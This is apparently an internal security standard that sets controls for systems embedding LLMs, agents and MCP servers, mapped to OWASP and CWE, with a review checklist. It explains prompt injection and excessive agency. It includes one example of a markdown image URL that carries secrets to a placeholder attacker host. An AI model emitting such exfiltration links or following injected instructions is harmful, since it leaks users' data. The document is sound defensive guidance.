# AI, Agent and MCP Controls — the overlay

Applies **in addition to** the solution's P1–R2 controls whenever the system embeds an LLM,
runs or calls an agent, exposes or consumes an MCP server, or lets a model call tools. It never
replaces them: an agent that can read the customer table is a Restricted solution with an
overlay, not "an AI project".

**Anchors.** [OWASP Top 10 for LLM Applications 2025](https://genai.owasp.org/llm-top-10/) for
the risk taxonomy; [NIST SP 800-218A](https://csrc.nist.gov/pubs/sp/800/218/a/final) — the SSDF
Generative AI community profile — where the team trains, fine-tunes or hosts a model; OWASP
ASVS v5.0 for the underlying application controls, which do not stop applying because a model
is involved.

---

## The one principle everything else follows from

> **The model is an untrusted component sitting inside your trust boundary.**

Not malicious, not adversarial — *untrusted*, in the precise sense: its output is a function of
inputs you do not fully control, and it can be steered by anyone who can get text in front of
it. A document it summarises, a web page it reads, a tool result it receives, a field in a
database row — all of these are attacker-reachable in most real systems.

Every control below is a consequence of that. If you find yourself reasoning "the model
wouldn't do that", stop: you are relying on a prompt as a security boundary.

---

## Controls

### AI-1 · Authorization is enforced in code, never by the prompt
**LLM06 Excessive Agency · CWE-862**

The most common serious flaw in agent systems. A system prompt saying *"only call
`refund_order` for orders belonging to the current user"* is documentation, not a control.

- Every tool call passes through the same authorization layer as an HTTP request from that
  principal, with the same object-level checks (§3.2 of `SKILL.md`).
- The model's identity is **not** the caller's identity. Resolve the acting principal from the
  session, pass it to the tool layer out of band, and never let the model supply or override it
  as a parameter.
- Tools are scoped individually. No `run_sql`, no `execute_shell`, no `http_request` with an
  arbitrary URL. If a tool needs breadth, it needs a policy in front of it.
- **Deny by default.** A newly registered tool is unavailable until explicitly granted.

### AI-2 · Treat every model output as untrusted input
**LLM05 Improper Output Handling · CWE-79, CWE-89, CWE-78**

- Model output rendered in a browser is escaped exactly like user input. Markdown rendered from
  a model needs the same sanitisation, and image/link URLs in it need the same allowlisting —
  a rendered `![](https://attacker/?d=<secrets>)` is a data-exfiltration channel.
- Model output that reaches a database, a shell, a template engine or another service is
  validated and parameterised exactly like user input.
- Structured output is validated against a schema before use. "It usually returns valid JSON"
  is not a parser.

### AI-3 · Treat every ingested source as an injection vector
**LLM01 Prompt Injection**

- Content the model retrieves — documents, web pages, emails, tickets, tool results, other
  agents' messages — is attacker-controlled unless proven otherwise. Delimit it, label it as
  data, and never let it change the tool policy.
- **There is no reliable filter for prompt injection.** Input classifiers, delimiters and
  instruction hierarchies reduce success rates; they do not close the class. Design so that a
  successful injection cannot cause harm — which is AI-1 — rather than trying to prevent every
  injection.
- Retrieval corpora are part of the attack surface (**LLM08 Vector and Embedding Weaknesses**):
  control who can write to them, and isolate per-tenant indexes.

### AI-4 · A human confirms consequential actions
**LLM06 Excessive Agency**

- Any action that moves money, changes access, sends external communication, deletes data or
  is otherwise irreversible requires explicit human confirmation showing the *actual* resolved
  parameters — not a summary the model wrote.
- Confirmation is per action, not a session-wide "yes to everything".
- Bound autonomy explicitly: maximum steps per task, maximum spend, maximum records touched.
  A loop with no bound is an outage.

### AI-5 · Secrets never enter the model's context
**LLM02 Sensitive Information Disclosure · CWE-798**

- API keys, database credentials and tokens are used by the *tool implementation*,
  server-side. They are never placed in a prompt, a tool description, a tool argument, or a
  system message.
- Prefer per-request, short-lived credentials (TTL ≤ 1 hour) for anything an agent path
  touches. Static credentials on an agent path rotate at the Restricted cadence (≤ 90 days)
  regardless of the solution's own classification, because the blast radius is the union of
  every tool.
- Assume the system prompt is readable (**LLM07 System Prompt Leakage**). Nothing secret goes in
  it — not credentials, not internal hostnames, not the authorization rules themselves.

### AI-6 · Fail closed, and say nothing useful
**CWE-754 · A10:2025**

- An authorization, validation or schema failure on an AI-initiated action denies the action.
- The error returned to the user is generic. No reasoning traces, no tool payloads, no stack
  traces, no internal identifiers.
- A provider fallback (model B when model A is down) inherits every control of model A. If it
  cannot, it is not a fallback — it is a bypass.

### AI-7 · Log the interaction as an audit trail
**A09:2025**

Per AI-initiated action, log: request identifier, acting principal, tool invoked, resolved
arguments (redacted), outcome, and the model and provider used. Model reasoning is **not** an
audit trail — it is a claim about what happened, and it is generated by the untrusted component.

Never log secrets, and never log full prompts or responses containing personal data. Redact at
the emitter.

### AI-8 · Bound consumption and cost
**LLM10 Unbounded Consumption · CWE-770 · API4:2023**

- Rate limits per principal on model calls, not only on HTTP requests.
- Token and spend budgets per user, per tenant and globally, with an enforced ceiling — not an
  alert.
- Cap context size and tool-call depth. An agent that can call itself needs a depth limit.

### AI-9 · Govern the supply chain of models and tools
**LLM03 Supply Chain · LLM04 Data and Model Poisoning · A03:2025**

- Providers and models are allowlisted; egress from the workload is restricted to those
  endpoints.
- **MCP servers are third-party code with tool-calling rights.** Review one before adoption
  exactly as you would a dependency with database access: read the source, pin the version,
  check what network calls it makes, check what it logs. A community MCP server pulled by tag
  is an unreviewed dependency with an authorization bypass built in.
- Pin model versions where the provider allows it, and re-test when a version changes.
- Where the team fine-tunes or hosts models, apply NIST SP 800-218A: provenance for training
  data, integrity for model artifacts, and the same signing and SBOM discipline as any other
  build output.

### AI-10 · The model is not a control, and the model is not a decision-maker
**LLM09 Misinformation**

- Do not use a model as the sole authority for an authorization, eligibility, pricing, safety
  or compliance decision. It may draft; a deterministic rule decides.
- Where a model's output is shown to a user as fact, either ground it in a cited source the
  user can open, or label its uncertainty. Confident wrong output is the failure mode.

---

## Review checklist

- [ ] Every tool call passes through the same authorization layer as an equivalent API call,
      including object-level checks (AI-1)
- [ ] The acting principal is resolved server-side and cannot be supplied by the model (AI-1)
- [ ] No broad tool exists (`run_sql`, `execute_shell`, arbitrary `http_request`) (AI-1)
- [ ] Model output is escaped/parameterised at every sink: HTML, SQL, shell, template (AI-2)
- [ ] Structured output is schema-validated before use (AI-2)
- [ ] Retrieved and tool-returned content is labelled as data and cannot change tool policy (AI-3)
- [ ] Retrieval indexes are per-tenant and write-controlled (AI-3)
- [ ] Irreversible actions require per-action human confirmation of resolved parameters (AI-4)
- [ ] Step, spend and record-count bounds exist and are enforced, not alerted (AI-4, AI-8)
- [ ] No credential appears in a prompt, system message, tool description or tool argument (AI-5)
- [ ] Agent-path credentials are short-lived, or rotate at ≤90 days (AI-5)
- [ ] The system prompt contains nothing that would be damaging if published (AI-5)
- [ ] Auth/validation failure on an AI action denies and returns a generic error (AI-6)
- [ ] Provider fallback preserves every control of the primary path (AI-6)
- [ ] Each AI action logs request/actor/tool/arguments/outcome/model, without secrets (AI-7)
- [ ] Egress is restricted to allowlisted model providers (AI-9)
- [ ] Every MCP server in use has been source-reviewed and pinned (AI-9)
- [ ] No authorization, pricing, eligibility or safety decision rests on model output (AI-10)

---

## What this overlay does not cover

Say so rather than implying coverage:

- **Model safety and alignment evaluation** — whether the model produces harmful content. That
  is a separate discipline with separate tooling.
- **Training-data privacy and licensing** — relevant when the team trains or fine-tunes;
  covered in part by NIST SP 800-218A, not here.
- **Regulatory regimes for AI systems** (EU AI Act obligations, sector rules). Assess as a
  separate overlay and label it as such.
